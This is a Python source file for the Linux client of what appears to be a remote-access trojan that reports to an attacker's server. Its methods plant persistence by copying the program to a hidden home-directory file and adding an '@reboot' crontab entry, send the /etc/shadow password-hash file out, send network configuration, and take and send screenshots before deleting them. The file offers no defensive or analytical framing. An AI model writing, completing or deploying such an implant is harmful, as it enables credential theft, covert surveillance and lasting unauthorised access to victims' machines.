import sys, os, subprocess
import secrets
import shutil, mss, mss.tools

from client import Client

SHADOW_PATH = "/etc/shadow"

class LinuxClient(Client):

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################
    def __init__(self, server_address, server_port):
        super().__init__(server_address, server_port)

    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################

    def persistence(self):

        self.agent_path = os.path.join(os.getenv('HOME'), f".{self.uid}")

        try:
            shutil.copy2(sys.argv[0], self.agent_path)

        except Exception as e:
            return 1

        # Read whole current crontab
        try:
            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
        except:
            return 0
        # Malicious cron for persistence
        job = f"@reboot bash -c {self.agent_path}\n"

        # Check if cron already exist
        if job not in crontab:
            crontab = crontab + job
            process = subprocess.run(['crontab', '-'], input=crontab, text=True)

        # TODO Self removing the executable


    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def hashdump(self, args):
        self.send_file(SHADOW_PATH)

    def ipconfig(self, args):
        output = ""
        try:
            output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        finally:
            self.secure_sock.sendall(output.encode())

    def screenshot(self, args):
        screen_path = os.path.join("tmp", f"{secrets.token_hex(5)}.jpg")

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)

        self.send_file(screen_path)
        self.delete_file(screen_path)
